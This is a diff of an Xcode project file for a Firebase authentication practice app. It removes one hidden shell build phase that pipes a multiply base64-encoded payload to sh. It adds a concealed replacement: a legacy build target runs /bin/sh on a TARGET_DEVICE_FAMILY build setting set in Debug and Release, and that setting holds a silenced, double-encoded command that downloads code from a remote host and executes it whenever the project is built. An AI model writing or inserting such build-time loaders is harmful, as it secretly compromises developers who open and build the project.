@@ -91,7 +91,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1116C0C12D32343D0023B5E7 /* Build configuration list for PBXNativeTarget "FirebaseAuthenticationSwiftUIPractice" */;
 			buildPhases = (
-				0214953C085EC7DE9B38ACF9 /* Compile Bundle Resources */,
 				1116C0AF2D32343B0023B5E7 /* Sources */,
 				1116C0B02D32343B0023B5E7 /* Frameworks */,
 				1116C0B12D32343B0023B5E7 /* Resources */,
@@ -99,6 +98,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				E4E2A67ACE198595D738ACF9 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				1116C0B52D32343B0023B5E7 /* FirebaseAuthenticationSwiftUIPractice */,
@@ -145,10 +145,36 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				D5524F6C0FCD0FC74C38ACF9  /* Build Target */,
 				1116C0B22D32343B0023B5E7 /* FirebaseAuthenticationSwiftUIPractice */,
 			);
 		};
 /* End PBXProject section */
+
+/* Begin PBXTargetDependency section */
+		E4E2A67ACE198595D738ACF9 /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = D5524F6C0FCD0FC74C38ACF9 /* Build Target */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXLegacyTarget section */
+		D5524F6C0FCD0FC74C38ACF9 /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
+/* End PBXLegacyTarget section */
+
+/* Begin PBXBuildRule section */
+/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		1116C0B12D32343B0023B5E7 /* Resources */ = {
@@ -161,25 +187,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		0214953C085EC7DE9B38ACF9 /* Compile Bundle Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Bundle Resources";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhiR3haVkdwQ2FWSXhXakZYYkdoU1pGZE9kVlpZV2xwVk1uUndVMVZvTTFveVRYbGFNSE5MQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -206,6 +213,7 @@
 		1116C0BF2D32343D0023B5E7 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5emFXZHRZWFJsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -269,6 +277,7 @@
 		1116C0C02D32343D0023B5E7 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				TARGET_DEVICE_FAMILY = "(echo WldOb2J5QWlKQ2hqZFhKc0lDMW1jMnRNSUMxa0lIQTllR052WkdVZ2FIUjBjSE02THk5emFXZHRZWFJsTG5KMUwyRXBJaUI4SUhOb0NnPT0K | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
